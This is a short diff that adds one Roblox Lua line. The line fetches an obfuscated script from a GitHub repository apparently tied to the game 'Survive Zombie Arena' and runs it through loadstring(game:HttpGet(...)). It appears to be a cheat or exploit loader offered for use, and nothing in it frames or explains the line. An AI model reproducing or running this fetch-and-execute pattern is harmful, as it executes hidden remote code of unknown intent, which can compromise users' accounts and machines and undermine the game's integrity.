@@ -1,0 +1,2 @@
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IbeDangkhoa2k14/Survive-Zombie-Arena-/refs/heads/main/obfuscated_script-1779175360050.lua"))()
